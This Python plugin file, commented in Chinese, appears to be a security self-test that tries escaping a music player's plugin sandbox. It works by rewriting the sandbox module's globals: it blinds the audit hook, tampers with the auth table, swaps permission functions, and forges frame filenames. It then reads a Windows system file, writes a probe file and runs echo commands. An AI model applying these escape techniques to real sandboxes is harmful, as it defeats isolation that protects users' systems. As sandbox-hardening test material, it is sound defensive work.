# -*- coding: utf-8 -*-
"""plugin/escape2 —— 第三批越权样本:判权/审计依赖的**模块 globals** 可写(2026-10)

它不是给人用的插件。默认 can_exec=true 只是为了让 dsh/escape2_selftest.py 能自动
装载它;真实播放器里只有名字进了 config.json 的 allow_plugin 才会加载 —— 别加进去。

和 plugin/escape 的分工:escape 打的是"策略数据 / 判权入口在 SandBox 实例上"那两批
(已经堵了,escape2 会复核一遍,期望全是 BLOCK)。escape2 打的是**下一层**:
`plugin_sandbox` 的模块 globals 本身。前两批把判权数据搬进了"模块私有的 `_AUTH`
记账表",但那张表、以及判权/审计用到的每个函数,都还在 `plugin_sandbox.__dict__` 里,
而同进程内省一行就能拿到它:

    g = type(__sandbox__).__init__.__globals__

实测能真的走出去的路(每条都对应 report() 里的一个 step):

| 手法 | 为什么成立 |
|---|---|
| `g['_FRAME_LOCAL'].depth = 5` | 审计钩子第一句 `if getattr(_depth,'depth',0): return`,置位后**第二道闸全局失明** |
| 往 `g['_AUTH'][id(box)]['session']` 里塞 `C:\\` | 记账表是普通 dict,`_auth_domain` 读的就是它 |
| `g['_auth_entry'] = <unsafe 记账>` | 钩子和门面都按**全局名**查找 `_auth_entry` |
| `g['under'] = lambda r,p: True` | `_auth_can` 里的 `any(under(r,target) ...)` 也是全局名查找 |
| 清 `_FRAME_TAGS`/`_FRAME_DIRS` + `g['_frame_registrar'].count = 0` | 防篡改靠计数比对,先归零再清表,钩子就认不出插件帧 |

根因:`install_audit_hook()` 只把**对象引用**收进了闭包 —— `_AUTH` 的**内容**、
`_auth_entry`/`under` 这些**函数本身**都不是闭包变量。

约定(照 plugin/escape):
    * 只做**只读**动作 + 一次 `echo` 起进程 + 一次"写完立刻删"的越权写探针;
    * 每条新路径跑完**立刻恢复原状**(depth / 记账 / 被替换的函数 / 注册表),
      不在宿主进程里留副作用;恢复动作都在 finally 里;
    * 判定只看"越权动作有没有成功",不看"改没改成"。

已知缺口(方案固有上限,SANDBOX.md 已写明,不在这里修):
`os.stat`/`os.lstat` 无审计事件、`os.environ` 可读、`pro.app._app` 穿透、Tcl 通道。
"""

import json
import os

OUTSIDE = r'C:\Windows\win.ini'
OUTSIDE_DIR = r'C:\Windows'
PROBE_FILE = r'D:\k\music\.escape2_probe.tmp'      # 越权写探针:写完立刻删

# 这些内部名字一旦在模块 globals 里出现,就等于把判权和审计交给了插件
WANTED = ('_AUTH','_FRAME_LOCAL','_FRAME_TAGS','_FRAME_DIRS','_frame_registrar',
          '_auth_entry','_auth_can','_auth_frozen','under','_norm','_HOST_TOKEN',
          '_AUDIT_HOOK','os','_builtins')

RESULT = []


# ---------------------------------------------------------------- 工具

def _rec(step, verdict, detail=''):
    RESULT.append((step, verdict, detail))
    tail = f'  -- {detail}' if detail else ''
    print(f'[escape2] {verdict:<5} {step}{tail}')


def _box():
    """从 __sandbox__ 拿回 SandBox 对象(.__self__ 就是它)。"""
    return __sandbox__.can.__self__


def _globals():
    """plugin_sandbox 的模块全局字典 —— 第三批的入口。"""
    return type(__sandbox__).__init__.__globals__


def _real_os():
    """模块 globals 里的真 os(不是门面)。"""
    return _globals()['os']


def _real_open():
    """模块 globals 里的真 builtins.open(不是门面)。"""
    return _globals()['_builtins'].open


def _short(exc):
    return f'{type(exc).__name__}: {exc}'[:64]


def _clean(text):
    """把读到的文件内容压成一行,免得报告里到处是换行。"""
    return ' '.join(str(text).split())


def _hook_blocks_real_read():
    """真 os 读插件目录之外:返回 ('BLOCK'|'OK'|'N/A', detail)。"""
    try:
        names = _real_os().listdir(OUTSIDE_DIR)
    except SandboxDenied as e:
        return 'BLOCK', str(e)[:64]
    except Exception as e:
        return 'N/A', _short(e)
    return 'OK', f'{len(names)} 个条目'


def _facade_reads_outside():
    """经门面 open() 读插件目录之外:返回 ('BLOCK'|'OK'|'N/A', detail)。"""
    try:
        with open(OUTSIDE, encoding='utf-8', errors='replace') as fp:
            data = fp.read(32)
    except SandboxDenied as e:
        return 'BLOCK', str(e)[:64]
    except Exception as e:
        return 'N/A', _short(e)
    return 'OK', _clean(data)[:28]


def _depth_guard():
    """把 _FRAME_LOCAL.depth 抬高,返回 (local, 原值) 供 finally 恢复。"""
    local = _globals().get('_FRAME_LOCAL')
    if local is None:
        return None, 0
    old = getattr(local, 'depth', 0)
    local.depth = max(old, 0) + 5
    return local, old


# ---------------------------------------------------------------- 第一段:复核前两批加固

def step_00_baseline():
    """先证明沙盒本来是好的:封存了、判权拒了、真 os 被钩子拦住。"""
    box = _box()
    sealed = box.is_sealed()
    allowed = False
    try:
        allowed = __sandbox__.can('fs:read', OUTSIDE)
    except Exception:
        pass
    hook, detail = _hook_blocks_real_read()
    ok = sealed and not allowed and hook == 'BLOCK'
    _rec('00 基线:已封存 + 判权拒 + 钩子拦真 os',
         'BLOCK' if ok else 'OK',
         f'sealed={sealed} can={allowed} hook={hook}({detail})')


def step_01_introspect():
    label = '01 内省拿回 SandBox 与模块 globals'
    try:
        box = _box()
        g = _globals()
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
        return None, None
    got = [n for n in WANTED if n in g]
    _rec(label, 'OK', f'模块 dict 里拿到 {len(got)} 个内部名字:{",".join(got[:6])}…')
    return box, g


def step_02_steal_token(g):
    label = '02 偷 _HOST_TOKEN(函数 __globals__)'
    try:
        token = g.get('_HOST_TOKEN')
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
        return None
    if token is None:
        _rec(label, 'BLOCK', '模块字典里没有这个名字')
        return None
    _rec(label, 'OK', f'id={id(token):#x}(拿到也未必能用)')
    return token


def step_03_use_token_unsafe(token):
    label = '03 拿偷来的凭据调 box.set_unsafe(True)'
    try:
        _box().set_unsafe(True, _host_token=token)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', 'unsafe 被打开 —— 沙盒当场失守')


def step_04_patch_policy():
    label = '04 直接改 box.policy.fs_read / net / proc'
    box = _box()
    try:
        box.policy.fs_read = [r'C:\\']
        box.policy.net = True
        box.policy.proc = True
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '策略被改写')


def step_05_spoof_can():
    label = '05 替换 box.can 为 lambda: True'
    box = _box()
    try:
        box.can = lambda cap, target=None: True
    except Exception as e:
        _rec(label, 'BLOCK', _short(e))
    else:
        _rec(label, 'OK', '判权入口被换掉')


# ---------------------------------------------------------------- 第二段:第三批新路径

def step_06_depth_blind():
    """一行置位 depth:审计钩子第一句就 return,第二道闸全局失明。"""
    label = '06 置位 _FRAME_LOCAL.depth -> 审计钩子全局失明'
    local = _globals().get('_FRAME_LOCAL')
    if local is None:
        _rec(label, 'N/A', '模块里没有 _FRAME_LOCAL')
        return
    old = getattr(local, 'depth', 0)
    try:
        local.depth = max(old, 0) + 5
        verdict, detail = _hook_blocks_real_read()
        if verdict == 'OK':
            try:
                rc = _real_os().system('echo ESCAPE2-DEPTH-BLIND')
                detail += f'; os.system rc={rc}'
            except Exception as e:
                detail += f'; os.system {_short(e)}'
        _rec(label, verdict, detail)
    finally:
        local.depth = old


def step_07_tamper_auth_table():
    """往 _AUTH 记账里塞授权:门面和钩子读的都是它。"""
    label = '07 往 _AUTH 记账里塞 fs:write/proc -> 判权恒真'
    g = _globals()
    auth = g.get('_AUTH')
    if not isinstance(auth, dict):
        _rec(label, 'N/A', '模块里没有 _AUTH 记账表')
        return
    ent = auth.get(id(_box()))
    if not isinstance(ent, dict) or 'session' not in ent:
        _rec(label, 'N/A', '记账里没有这个沙盒')
        return
    sess = ent['session']
    saved = (set(sess.get('fs:read', ())), set(sess.get('fs:write', ())),
             sess.get('net'), sess.get('proc'))
    try:
        sess.setdefault('fs:write', set()).add('C:\\')
        sess.setdefault('fs:read', set()).add('C:\\')
        sess['proc'] = True
        allowed = __sandbox__.can('fs:write', 'C:\\')
        facade, fdetail = _facade_reads_outside()
        hook, hdetail = _hook_blocks_real_read()
        if allowed and (facade == 'OK' or hook == 'OK'):
            _rec(label, 'OK',
                 f'can(fs:write,C:\\)=True;门面={facade}{fdetail};真os={hook}{hdetail}')
        else:
            _rec(label, 'BLOCK',
                 f'can={allowed} 门面={facade} 真os={hook}')
    finally:
        # set 不支持切片赋值,只能 clear + update 原地还原
        try:
            for key, keep in (('fs:read', saved[0]), ('fs:write', saved[1])):
                live = sess.get(key)
                if isinstance(live, set):
                    live.clear()
                    live.update(keep)
            sess['net'] = saved[2]
            sess['proc'] = saved[3]
        except Exception:
            pass


def step_08_swap_under():
    """替换模块级 under():_auth_can 里的前缀判定恒真。"""
    label = '08 替换模块级 under() -> 门面判权恒真'
    g = _globals()
    orig = g.get('under')
    if orig is None:
        _rec(label, 'N/A', '模块里没有 under')
        return
    try:
        g['under'] = lambda root, path: True
        facade, detail = _facade_reads_outside()
        _rec(label, facade, f'门面 open:{detail}')
    finally:
        g['under'] = orig


def step_09_swap_auth_entry():
    """替换 _auth_entry():钩子和门面都按全局名调它,两道闸一起失明。"""
    label = '09 替换模块级 _auth_entry() -> 门面 + 钩子同时失明'
    g = _globals()
    orig = g.get('_auth_entry')
    if orig is None:
        _rec(label, 'N/A', '模块里没有 _auth_entry')
        return

    class _UnsafeSnapshot:
        unsafe = True

    fake = {'box': _box(), 'policy': None, 'frozen': _UnsafeSnapshot(),
            'org': None, 'session': {'fs:read': set(), 'fs:write': set(),
                                     'net': True, 'proc': True},
            'tamper_warned': set()}
    try:
        g['_auth_entry'] = lambda box: fake
        facade, fdetail = _facade_reads_outside()
        hook, hdetail = _hook_blocks_real_read()
        verdict = 'OK' if (facade == 'OK' or hook == 'OK') else 'BLOCK'
        _rec(label, verdict, f'门面={facade}{fdetail};真os(钩子)={hook}{hdetail}')
    finally:
        g['_auth_entry'] = orig


def step_10_clear_frame_registry():
    """清空帧注册表 + 把注册记账归零:钩子认不出插件帧,静默放行。"""
    label = '10 清 _FRAME_TAGS/_FRAME_DIRS + 记账归零 -> 钩子认不出插件'
    g = _globals()
    tags = g.get('_FRAME_TAGS')
    dirs = g.get('_FRAME_DIRS')
    registrar = g.get('_frame_registrar')
    if not isinstance(tags, dict) or not isinstance(dirs, list) or registrar is None:
        _rec(label, 'N/A', '注册表/记账不在模块 globals 里')
        return
    saved_tags = dict(tags)
    saved_dirs = list(dirs)
    saved_count = getattr(registrar, 'count', 0)
    try:
        registrar.count = 0            # 先归零:tampered() 变成 0 < 0 = False
        tags.clear()
        dirs.clear()
        hook, detail = _hook_blocks_real_read()
        _rec(label, hook, f'真 os 读 {OUTSIDE_DIR}:{detail}')
    finally:
        try:
            registrar.count = saved_count
            tags.update(saved_tags)
            dirs[:] = saved_dirs
        except Exception:
            pass


# ---------------------------------------------------------------- 第三段:完整走出去

def step_11_full_escape():
    """组合拳:致盲钩子之后用真 os 读 + 越权写 + 起进程。"""
    label = '11 组合拳:读外面 + 越权写 + 起进程(写完立刻删)'
    g = _globals()
    local = g.get('_FRAME_LOCAL')
    if local is None:
        _rec(label, 'N/A', '模块里没有 _FRAME_LOCAL')
        return
    old = getattr(local, 'depth', 0)
    log = []
    try:
        local.depth = max(old, 0) + 5
        ros = _real_os()
        with _real_open()(OUTSIDE, encoding='utf-8', errors='replace') as fp:
            log.append(f'read={_clean(fp.read(20))[:16]!r}')
        with _real_open()(PROBE_FILE, 'w', encoding='utf-8') as fp:
            fp.write('escape2')
        log.append(f'wrote={ros.path.isfile(PROBE_FILE)}')
        log.append(f'system_rc={ros.system("echo ESCAPE2-FULL-ESCAPE")}')
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
        return
    except Exception as e:
        _rec(label, 'N/A', _short(e))
        return
    finally:
        # 清理必须在**恢复 depth 之前**做:恢复之后 os.remove 自己就会被钩子拦下
        try:
            if _real_os().path.isfile(PROBE_FILE):
                _real_os().remove(PROBE_FILE)
                log.append('cleaned=1')
        except Exception:
            log.append('cleaned=0')
        finally:
            local.depth = old
    _rec(label, 'OK' if 'cleaned=1' in log else 'N/A', '; '.join(log))


def step_12_fake_filename_thread():
    """帧识别靠 co_filename,而插件能自己指定它 —— 再借新线程甩掉外层插件帧。

    审计钩子判断"是不是插件干的"靠 `_box_for_frame(frame.f_code.co_filename)`:
    先比 `<plugin 名字 ` 前缀,再比插件目录。而 `compile(src, filename, mode)` 的
    filename 是**插件自己传的**(沙盒门面的 compile 也照传),于是:

        code = compile(src, '<not-a-plugin>', 'exec')   # 帧名随我写
        exec(code, {...})                               # 这个帧钩子认不出来

    在当前线程里还不够 —— 栈上外层那个真插件帧仍在,扫栈时会被找到。所以再借
    `g['threading']` 起一条**新线程**:新线程的栈上只有伪造帧,一个插件帧都没有,
    钩子直接判定"不是插件干的"放行。注意目标 lambda 也定义在那个伪造文件名的
    编译单元里,否则 lambda 自己又会带上插件帧名。
    """
    label = '12 伪造 co_filename + 新线程 -> 钩子认不出插件帧'
    g = _globals()
    threading_mod = g.get('threading')
    if threading_mod is None:
        _rec(label, 'N/A', '模块 globals 里没有 threading')
        return
    src = (
        "real = PAYLOAD['os']\n"
        "th = PAYLOAD['threading']\n"
        "th.Thread(target=lambda: real.system('echo ESCAPE2-FAKE-FRAME')).start()\n"
    )
    try:
        # 整段(连 lambda 一起)都编译成伪造文件名,再 exec 进一个新命名空间
        exec(compile(src, '<not-a-plugin>', 'exec'),
             {'PAYLOAD': {'os': g['os'], 'threading': threading_mod}})
        # 新线程是异步的:等它跑完,好让输出和审计都落定
        g['time'].sleep(0.4)
    except SandboxDenied as e:
        _rec(label, 'BLOCK', str(e)[:64])
        return
    except Exception as e:
        _rec(label, 'N/A', _short(e))
        return
    _rec(label, 'OK', '新线程里的真 os.system 没有被拦(输出见 ESCAPE2-FAKE-FRAME)')


def step_13_fake_filename_after():
    """同一招走门面白名单方法 pro.app.after:真实 mainloop 里回调帧同样认不出来。

    自测用的 FakeApp.after 是**同步**调用的,回调仍在插件调用链上,外层插件帧
    还在,所以这里多半会看到 BLOCK —— 那不是"挡住了",只是夹具不同步。
    """
    label = '13 伪造 co_filename + pro.app.after 回调(真机 mainloop)'
    g = _globals()
    src = (
        "real = PAYLOAD['os']\n"
        "def cb():\n"
        "    real.system('echo ESCAPE2-AFTER-FAKE-FRAME')\n"
    )
    ns = {'PAYLOAD': {'os': g['os']}}
    try:
        exec(compile(src, '<not-a-plugin>', 'exec'), ns)
        cb = ns['cb']                      # 这个函数的 co_filename 是 <not-a-plugin>
        pro.app.after(0, cb)
        g['time'].sleep(0.2)
    except SandboxDenied as e:
        _rec(label, 'N/A',
             f'自测夹具的 after 是同步的,回调还在插件链上:{str(e)[:40]}')
        return
    except Exception as e:
        _rec(label, 'N/A', _short(e))
        return
    _rec(label, 'N/A', '自测夹具同步执行看不出差别;真机 mainloop 回调里可行')


# ---------------------------------------------------------------- 报告

def report():
    RESULT.clear()
    line = '=' * 66
    print(line)
    print('[escape2] 第三批越权样本(plugin/escape2)—— 模块 globals 可写')
    print(line)
    try:
        print('已封存     =', _box().is_sealed())
        print('策略       =', __sandbox__.describe())
        print('模块 globals 里可写的内部名字 =',
              sum(1 for n in WANTED if n in _globals()))
    except Exception as e:
        print('环境信息读取失败:', _short(e))
    print('目标文件   =', OUTSIDE)
    print('-' * 66)

    print('第零段:基线(沙盒本来该拦住)')
    step_00_baseline()

    print('-' * 66)
    print('第一段:复核前两批加固点(期望 BLOCK)')
    box, g = step_01_introspect()
    if g is not None:
        token = step_02_steal_token(g)
        step_03_use_token_unsafe(token)
        step_04_patch_policy()
        step_05_spoof_can()

    print('-' * 66)
    print('第二段:第三批新路径(模块 globals 本身)')
    step_06_depth_blind()
    step_07_tamper_auth_table()
    step_08_swap_under()
    step_09_swap_auth_entry()
    step_10_clear_frame_registry()

    print('-' * 66)
    print('第三段:完整走出去')
    step_11_full_escape()

    print('-' * 66)
    print('第四段:帧识别本身可伪造(co_filename 由插件自己传)')
    step_12_fake_filename_thread()
    step_13_fake_filename_after()

    print('-' * 66)
    ok = [s for s, v, _ in RESULT if v == 'OK']
    blocked = [s for s, v, _ in RESULT if v == 'BLOCK']
    na = [s for s, v, _ in RESULT if v == 'N/A']
    print(f'汇总:OK={len(ok)}  BLOCK={len(blocked)}  N/A={len(na)}')
    for s in ok:
        print('  越权成功:', s)
    if not ok:
        print('  越权成功的项:无')
    print(line)
    return {'ok': ok, 'blocked': blocked, 'na': na}


def report_quick():
    """只看第一段和第二段第 06 步:最省事的那条路还灵不灵。"""
    RESULT.clear()
    print(f'[escape2] 快速自查:sealed={_box().is_sealed()} 策略={__sandbox__.describe()}')
    step_00_baseline()
    step_06_depth_blind()
    return report()


# 装载时只挂菜单、只打印:init 里**不做**任何逃逸动作。
# 真实播放器里 init 是 app.after(0,...) 投递的,那时早就封存完了;
# 集成测试里 FakeApp.after 会立刻执行,此时还没封存 —— 两边行为不同,
# 所以逃逸动作一律放在菜单回调里,避免测试和真实环境看到不同的东西。
if not __start_sandbox__:
    print('未启用沙盒')
else:# 装载时就把菜单挂上(dsh/escape_selftest.py 靠 label 里的"完整报告"找回调)

    print(f'[escape2] 第三批越权样本已装载(env_id={__env_id__}),策略:{__sandbox__.describe()}')
    pro.menu.add_command(label='escape2:越权报告(模块 globals)', command=report)
    pro.menu.add_command(label='escape2:快速自查', command=report_quick)
